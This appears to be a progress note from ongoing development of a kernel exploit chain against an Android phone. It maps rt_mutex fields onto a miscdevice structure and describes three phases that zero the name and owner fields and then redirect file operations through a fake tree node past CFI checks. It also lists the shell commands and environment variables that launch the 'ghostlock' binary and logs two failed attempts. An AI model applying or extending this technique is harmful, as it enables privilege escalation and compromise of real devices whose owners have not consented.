# CHAIN3: ZERO_NAME + ZERO_OWNER + ION_SAFE (2026-08-09)

## Motivation (moves the bar)

GLM + layout analysis: ION with `lock=MISC-8` maps:

| rt_mutex field | Address | Field on miscdevice |
|----------------|---------|---------------------|
| wait_lock | MISC−8 | **name** (zero via ZERO_NAME) |
| waiters root | MISC | **fops** (redirect target) |
| owner | MISC+16 | **list.prev** (was **non-NULL** → setprio(garbage) softboot) |

Prior ION/CHAIN only zeroed name. **Owner stayed non-zero** → softboot after erase even with rb-leaf fops.

## Code change (built)

`ghostlock-cph2521` **133544** bytes, rebuilt 2026-08-09 ~22:54.

`MODE4_CHAIN=1` is now **3 phases** same process:

1. **ZERO_NAME** — leaf parent=MISC−16 → `*name=0` (wait_lock)
2. **ZERO_OWNER** — leaf parent=MISC+8 → `*list.prev=0` at MISC+16 (owner)
3. **ION_SAFE** — lock=MISC−8, parent=1, right=fake_fops (rb-leaf), prio=200

Also: auto LOCK_OWNER0 packing for CHAIN/ZERO/ION spray; ION stack prio=200.

## Fire (when ADB clean, uptime ≲45s)

```sh
cd /data/local/tmp
export MODE4_CHAIN=1 MODE4_PROOF=1 MODE4_CFI_ON_PUNCH=1 FOPS_MAX_ATTEMPTS=4
export PSELECT_ROUTE_DELAY_USEC=150000
./ghostlock-cph2521
```

**Success signals:** stage shows `chain_zero_name_done`, `chain_zero_owner_done_next_ion`, then ION `post_setattr`, ideally **cfi errno ≠ 22**.

**Fail class:** softboot at which phase (pre_setattr only + boot_id).

## Status / fires

| Fire | Boot | Result |
|------|------|--------|
| r1 (uptime~121s) | 3553ce91… | KS spray fail ×4 — EXIT 255, **same boot** |
| r2 clean (uptime~22s) | 61d77cdd… | EDEADLK 35, **phase1 ZERO_NAME only**, `pre_setattr` only, **true softboot** → 685a65ae… |

Phase2/3 never reached. Banner line can false-match ZERO_OWNER/ION in greps — stage only has phase1.

**Bar:** code/path improved; device still no post_setattr on ZERO this boot. Plateau default untouched.
